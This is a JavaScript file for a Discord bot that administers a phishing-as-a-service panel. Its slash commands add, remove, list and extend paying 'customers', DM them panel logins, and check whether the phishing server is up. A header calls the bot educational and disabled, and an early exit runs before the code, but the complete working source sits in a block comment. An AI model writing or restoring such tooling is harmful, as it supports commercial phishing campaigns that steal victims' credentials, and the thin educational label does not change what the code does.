/*
 * EDUCATIONAL DISCORD BOT - DISABLED FOR SAFETY
 * =============================================
 * 
 * This Discord bot has been disabled to prevent misuse.
 * It was originally designed to demonstrate how attackers might:
 * - Automatically notify operators of new victims
 * - Provide real-time updates on credential capture
 * - Manage phishing campaigns remotely
 * 
 * For educational purposes only - DO NOT USE for malicious activities
 */

console.log('📚 EDUCATIONAL NOTICE: Discord bot functionality has been disabled');
console.log('🔒 This prevents automated victim notifications and remote campaign management');
console.log('💡 In a real attack, this would provide instant alerts to attackers');

// Exit early to prevent any Discord functionality
process.exit(0);

// Original Discord bot code below (commented out for educational purposes):
/*
const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes } = require('discord.js');
const axios = require('axios');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

// Configuration
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID; // Optional: for guild-specific commands
const API_URL = process.env.API_URL || 'http://localhost:3000';
const PHISHING_URL = process.env.PHISHING_URL || 'http://localhost:5000';
const AUTHORIZED_ROLES = ['Admin', 'Owner', 'Manager']; // Roles that can use the bot
const AUTHORIZED_USERS = []; // Add Discord user IDs here for specific users

// Commands
const commands = [
    new SlashCommandBuilder()
        .setName('addcustomer')
        .setDescription('Add a new customer to the phishing panel')
        .addUserOption(option =>
            option.setName('user')
                .setDescription('Discord user to give access to')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Username for the customer panel')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('email')
                .setDescription('Email address (optional)')
                .setRequired(false))
        .addIntegerOption(option =>
            option.setName('duration')
                .setDescription('Access duration in days (default: 30)')
                .setRequired(false)),
    
    new SlashCommandBuilder()
        .setName('removecustomer')
        .setDescription('Remove a customer from the phishing panel')
        .addStringOption(option =>
            option.setName('identifier')
                .setDescription('Username or Discord user')
                .setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('listcustomers')
        .setDescription('List all active customers'),
    
    new SlashCommandBuilder()
        .setName('extendcustomer')
        .setDescription('Extend customer access')
        .addStringOption(option =>
            option.setName('identifier')
                .setDescription('Username to extend')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('days')
                .setDescription('Days to extend (default: 30)')
                .setRequired(false)),
    
    new SlashCommandBuilder()
        .setName('customerinfo')
        .setDescription('Get customer information')
        .addStringOption(option =>
            option.setName('identifier')
                .setDescription('Username or Discord user')
                .setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('status')
        .setDescription('Check system status'),
];

// Register commands
const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);

async function registerCommands() {
    try {
        console.log('Started refreshing application (/) commands.');
        
        if (GUILD_ID) {
            // Guild-specific commands (faster deployment)
            await rest.put(
                Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
                { body: commands },
            );
        } else {
            // Global commands (takes up to 1 hour)
            await rest.put(
                Routes.applicationCommands(CLIENT_ID),
                { body: commands },
            );
        }
        
        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
}

// Helper functions
function isAuthorized(interaction) {
    const member = interaction.member;
    
    // Check if user ID is in authorized users list
    if (AUTHORIZED_USERS.includes(interaction.user.id)) {
        return true;
    }
    
    // Check if user has authorized role
    if (member && member.roles && member.roles.cache) {
        return AUTHORIZED_ROLES.some(role => 
            member.roles.cache.some(r => r.name === role)
        );
    }
    
    return false;
}

async function makeAPIRequest(endpoint, method = 'GET', data = null) {
    try {
        const config = {
            method,
            url: `${API_URL}${endpoint}`,
            headers: {
                'Content-Type': 'application/json',
            },
        };
        
        if (data) {
            config.data = data;
        }
        
        const response = await axios(config);
        return response.data;
    } catch (error) {
        console.error('API request failed:', error.message);
        return { success: false, message: error.message };
    }
}

function createEmbed(title, description, color = '#0052ff') {
    return new EmbedBuilder()
        .setTitle(title)
        .setDescription(description)
        .setColor(color)
        .setTimestamp()
        .setFooter({ text: 'Phishing Management Bot' });
}

// Bot events
client.once('ready', () => {
    console.log('═══════════════════════════════════════════════════════');
    console.log('🤖 DISCORD BOT - PHISHING MANAGEMENT SUITE');
    console.log('═══════════════════════════════════════════════════════');
    console.log(`✅ Logged in as ${client.user.tag}!`);
    console.log(`🌐 API URL: ${API_URL}`);
    console.log(`🎯 Phishing URL: ${PHISHING_URL}`);
    console.log('═══════════════════════════════════════════════════════');
    
    client.user.setActivity('Managing phishing customers', { type: 'WATCHING' });
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    // Check authorization
    if (!isAuthorized(interaction)) {
        await interaction.reply({
            content: '❌ You are not authorized to use this bot.',
            ephemeral: true
        });
        return;
    }
    
    const { commandName } = interaction;
    
    try {
        switch (commandName) {
            case 'addcustomer':
                await handleAddCustomer(interaction);
                break;
            case 'removecustomer':
                await handleRemoveCustomer(interaction);
                break;
            case 'listcustomers':
                await handleListCustomers(interaction);
                break;
            case 'extendcustomer':
                await handleExtendCustomer(interaction);
                break;
            case 'customerinfo':
                await handleCustomerInfo(interaction);
                break;
            case 'status':
                await handleStatus(interaction);
                break;
            default:
                await interaction.reply('Unknown command.');
        }
    } catch (error) {
        console.error('Command error:', error);
        await interaction.reply({
            content: '❌ An error occurred while processing your command.',
            ephemeral: true
        });
    }
});

// Command handlers
async function handleAddCustomer(interaction) {
    await interaction.deferReply();
    
    const user = interaction.options.getUser('user');
    const username = interaction.options.getString('username');
    const email = interaction.options.getString('email');
    const duration = interaction.options.getInteger('duration') || 30;
    
    const result = await makeAPIRequest('/api/discord/add-customer', 'POST', {
        discordId: user.id,
        username,
        email,
        duration
    });
    
    if (result.success) {
        const embed = createEmbed(
            '✅ Customer Added Successfully',
            `**User:** ${user.tag}\n` +
            `**Username:** ${username}\n` +
            `**Password:** \`${result.customer.password}\`\n` +
            `**Email:** ${result.customer.email}\n` +
            `**Expires:** <t:${Math.floor(new Date(result.customer.expiryDate).getTime() / 1000)}:F>\n\n` +
            `**Login URL:** [Customer Portal](${PHISHING_URL}/customer)`,
            '#00ff00'
        );
        
        await interaction.editReply({ embeds: [embed] });
        
        // Try to DM the user their credentials
        try {
            const dmEmbed = createEmbed(
                '🔐 Your Phishing Panel Access',
                `You have been granted access to the phishing management panel!\n\n` +
                `**Username:** ${username}\n` +
                `**Password:** \`${result.customer.password}\`\n` +
                `**Login URL:** ${PHISHING_URL}/customer\n\n` +
                `Your access expires on <t:${Math.floor(new Date(result.customer.expiryDate).getTime() / 1000)}:F>`,
                '#0052ff'
            );
            
            await user.send({ embeds: [dmEmbed] });
        } catch (dmError) {
            console.log('Could not DM user:', dmError.message);
        }
    } else {
        const embed = createEmbed(
            '❌ Failed to Add Customer',
            result.message || 'Unknown error occurred',
            '#ff0000'
        );
        await interaction.editReply({ embeds: [embed] });
    }
}

async function handleRemoveCustomer(interaction) {
    await interaction.deferReply();
    
    const identifier = interaction.options.getString('identifier');
    
    const result = await makeAPIRequest('/api/discord/remove-customer', 'POST', {
        identifier
    });
    
    if (result.success) {
        const embed = createEmbed(
            '✅ Customer Removed',
            result.message,
            '#ff9900'
        );
        await interaction.editReply({ embeds: [embed] });
    } else {
        const embed = createEmbed(
            '❌ Failed to Remove Customer',
            result.message || 'Customer not found',
            '#ff0000'
        );
        await interaction.editReply({ embeds: [embed] });
    }
}

async function handleListCustomers(interaction) {
    await interaction.deferReply();
    
    const result = await makeAPIRequest('/api/discord/list-customers');
    
    if (result.success) {
        const customers = result.customers;
        
        if (customers.length === 0) {
            const embed = createEmbed(
                '📝 Customer List',
                'No customers found.',
                '#ffaa00'
            );
            await interaction.editReply({ embeds: [embed] });
            return;
        }
        
        const customerList = customers.map((customer, index) => {
            const expiryTimestamp = Math.floor(new Date(customer.expiryDate).getTime() / 1000);
            const status = new Date(customer.expiryDate) > new Date() ? '🟢 Active' : '🔴 Expired';
            
            return `**${index + 1}.** ${customer.username}\n` +
                   `└ ${status} • Expires: <t:${expiryTimestamp}:R>`;
        }).join('\n\n');
        
        const embed = createEmbed(
            `📝 Customer List (${customers.length} total)`,
            customerList,
            '#0052ff'
        );
        
        await interaction.editReply({ embeds: [embed] });
    } else {
        const embed = createEmbed(
            '❌ Failed to Get Customer List',
            result.message || 'Unknown error occurred',
            '#ff0000'
        );
        await interaction.editReply({ embeds: [embed] });
    }
}

async function handleExtendCustomer(interaction) {
    await interaction.deferReply();
    
    const identifier = interaction.options.getString('identifier');
    const days = interaction.options.getInteger('days') || 30;
    
    const result = await makeAPIRequest('/api/discord/extend-customer', 'POST', {
        identifier,
        days
    });
    
    if (result.success) {
        const expiryTimestamp = Math.floor(new Date(result.newExpiry).getTime() / 1000);
        const embed = createEmbed(
            '✅ Customer Extended',
            `${result.message}\n**New expiry:** <t:${expiryTimestamp}:F>`,
            '#00ff00'
        );
        await interaction.editReply({ embeds: [embed] });
    } else {
        const embed = createEmbed(
            '❌ Failed to Extend Customer',
            result.message || 'Customer not found',
            '#ff0000'
        );
        await interaction.editReply({ embeds: [embed] });
    }
}

async function handleCustomerInfo(interaction) {
    await interaction.deferReply();
    
    const identifier = interaction.options.getString('identifier');
    
    const result = await makeAPIRequest('/api/discord/list-customers');
    
    if (result.success) {
        const customer = result.customers.find(c => 
            c.username === identifier || 
            c.discordId === identifier ||
            c.id === identifier
        );
        
        if (customer) {
            const expiryTimestamp = Math.floor(new Date(customer.expiryDate).getTime() / 1000);
            const createdTimestamp = Math.floor(new Date(customer.createdAt).getTime() / 1000);
            const status = new Date(customer.expiryDate) > new Date() ? '🟢 Active' : '🔴 Expired';
            
            const embed = createEmbed(
                `👤 Customer Information`,
                `**Username:** ${customer.username}\n` +
                `**Email:** ${customer.email}\n` +
                `**Status:** ${status}\n` +
                `**Access Level:** ${customer.accessLevel}\n` +
                `**Created:** <t:${createdTimestamp}:F>\n` +
                `**Expires:** <t:${expiryTimestamp}:F>\n` +
                `**Discord ID:** ${customer.discordId || 'N/A'}`,
                '#0052ff'
            );
            
            await interaction.editReply({ embeds: [embed] });
        } else {
            const embed = createEmbed(
                '❌ Customer Not Found',
                'No customer found with that identifier.',
                '#ff0000'
            );
            await interaction.editReply({ embeds: [embed] });
        }
    } else {
        const embed = createEmbed(
            '❌ Failed to Get Customer Info',
            result.message || 'Unknown error occurred',
            '#ff0000'
        );
        await interaction.editReply({ embeds: [embed] });
    }
}

async function handleStatus(interaction) {
    await interaction.deferReply();
    
    try {
        const apiStatus = await makeAPIRequest('/');
        const phishingStatus = await axios.get(`${PHISHING_URL}/api/server-info`);
        
        const embed = createEmbed(
            '📊 System Status',
            `**API Server:** ${apiStatus.status === 'online' ? '🟢 Online' : '🔴 Offline'}\n` +
            `**Phishing Server:** ${phishingStatus.data ? '🟢 Online' : '🔴 Offline'}\n` +
            `**Total Customers:** ${apiStatus.customers || 0}\n` +
            `**API URL:** ${API_URL}\n` +
            `**Phishing URL:** ${PHISHING_URL}`,
            '#0052ff'
        );
        
        await interaction.editReply({ embeds: [embed] });
    } catch (error) {
        const embed = createEmbed(
            '❌ Status Check Failed',
            'Unable to connect to servers.',
            '#ff0000'
        );
        await interaction.editReply({ embeds: [embed] });
    }
}

// Error handling
client.on('error', console.error);

process.on('unhandledRejection', error => {
    console.error('Unhandled promise rejection:', error);
});

// Start the bot
if (!DISCORD_TOKEN) {
    console.error('❌ DISCORD_TOKEN is required! Set it in your .env file.');
    process.exit(1);
}

if (!CLIENT_ID) {
    console.error('❌ CLIENT_ID is required! Set it in your .env file.');
    process.exit(1);
}

registerCommands().then(() => {
    client.login(DISCORD_TOKEN);
  }).catch(console.error);
*/

// END OF COMMENTED DISCORD BOT CODE
console.log('📚 All Discord bot functionality has been disabled for educational safety'); 